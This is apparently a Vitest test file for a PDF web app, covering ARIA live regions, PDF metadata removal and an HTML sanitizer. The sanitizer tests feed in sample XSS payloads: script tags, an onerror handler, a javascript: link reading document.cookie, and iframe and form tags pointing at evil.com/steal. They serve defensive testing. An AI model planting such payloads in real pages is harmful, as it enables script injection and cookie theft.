import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import ProgressBar from "@/components/ProgressBar";
import ErrorBanner from "@/components/ErrorBanner";
import SuccessAnimation from "@/components/SuccessAnimation";
import { sanitizePreviewHtml } from "@/app/html-to-pdf/page";
import { sanitizePdf } from "@/lib/pdfSanitize";
import { PDFDocument } from "pdf-lib";

describe("Accessibility & Live Regions", () => {
  it("ProgressBar has role='progressbar' and updates ARIA values", () => {
    const { rerender } = render(<ProgressBar processing={true} label="Compressing PDF..." />);
    const bar = screen.getByRole("progressbar");
    expect(bar).toBeDefined();
    expect(bar.getAttribute("aria-label")).toBe("Compressing PDF...");
    expect(bar.getAttribute("aria-valuemin")).toBe("0");
    expect(bar.getAttribute("aria-valuemax")).toBe("100");

    rerender(<ProgressBar processing={true} label="Almost done..." />);
    const updatedBar = screen.getByRole("progressbar");
    expect(updatedBar.getAttribute("aria-label")).toBe("Almost done...");
  });

  it("ErrorBanner has role='alert' and aria-live='assertive'", () => {
    render(<ErrorBanner message="Failed to parse document" />);
    const alert = screen.getByRole("alert");
    expect(alert).toBeDefined();
    expect(alert.getAttribute("aria-live")).toBe("assertive");
    expect(alert.textContent).toContain("Failed to parse document");
  });

  it("SuccessAnimation has role='status' and aria-live='polite'", () => {
    render(<SuccessAnimation show={true} message="Saved successfully" />);
    const status = screen.getByRole("status");
    expect(status).toBeDefined();
    expect(status.getAttribute("aria-live")).toBe("polite");
    expect(status.textContent).toContain("Saved successfully");
  });
});

describe("HTML-to-PDF DOM Sanitizer Security", () => {
  it("strips script tags and inline event handlers", () => {
    const dirty = '<p>Safe Text<script>alert("xss")</script><img src="x" onerror="alert(1)"></p>';
    const cleaned = sanitizePreviewHtml(dirty);
    expect(cleaned).not.toContain("<script>");
    expect(cleaned).not.toContain("onerror");
    expect(cleaned).toContain("Safe Text");
  });

  it("strips malicious javascript: URLs", () => {
    const dirty = '<a href="javascript:alert(document.cookie)">Click me</a>';
    const cleaned = sanitizePreviewHtml(dirty);
    expect(cleaned).not.toContain("javascript:");
    expect(cleaned).toContain("Click me");
  });

  it("strips iframes, forms, and object/embed tags", () => {
    const dirty = `
      <div>
        <iframe src="https://evil.com"></iframe>
        <form action="https://evil.com/steal"><input name="user" /></form>
        <object data="malicious.swf"></object>
      </div>
    `;
    const cleaned = sanitizePreviewHtml(dirty);
    expect(cleaned).not.toContain("<iframe");
    expect(cleaned).not.toContain("<form");
    expect(cleaned).not.toContain("<object");
  });
});

describe("PDF Sanitization & Permissions", () => {
  it("removes metadata from a newly generated document cleanly", async () => {
    const doc = await PDFDocument.create();
    doc.setTitle("Secret Title");
    doc.setAuthor("Secret Author");
    doc.addPage([300, 300]);
    const pdfBytes = await doc.save();

    const result = await sanitizePdf(pdfBytes);
    expect(result.before.title).toBe("Secret Title");
    expect(result.before.author).toBe("Secret Author");
    expect(result.bytes).toBeInstanceOf(Uint8Array);

    const reloaded = await PDFDocument.load(result.bytes);
    expect(reloaded.getTitle()).toBeUndefined();
    expect(reloaded.getAuthor()).toBeUndefined();
  });
});
